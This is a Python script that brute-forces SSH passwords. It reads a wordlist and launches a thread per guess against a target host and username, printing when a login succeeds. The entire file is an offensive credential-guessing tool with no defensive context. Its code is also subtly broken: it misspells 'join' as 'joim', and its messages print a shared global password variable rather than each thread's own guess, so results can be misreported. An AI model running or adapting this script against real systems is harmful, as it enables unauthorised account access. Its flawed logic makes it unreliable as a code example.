import paramiko,sys,os,socket,termcolor
import threading,time

stop_flag=0

host = input('[+] Target Addresss: ')
username=input('[+] SSH Username: ')
input_file = input('[+] Password File: ')
print("\n")

def ssh_connect(pwd,code=0):
    global stop_flag
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,port=22,username=username,password=pwd)
        stop_flag=1
        print(termcolor.colored(("[+] Password Found: ",password," For Account: ",username),"green"))
    except:
        print("[-] Incorrect Login: ",password)
    ssh.close()


if os.path.exists(input_file) == False:
    print("[!!] File/Path doesn't exist")
    sys.exit(1)

with open(input_file,'r') as file:
    for line in file.readlines():
        if stop_flag==1:
            t.joim()
            exit()
        
        password =line.strip()
        t=threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
            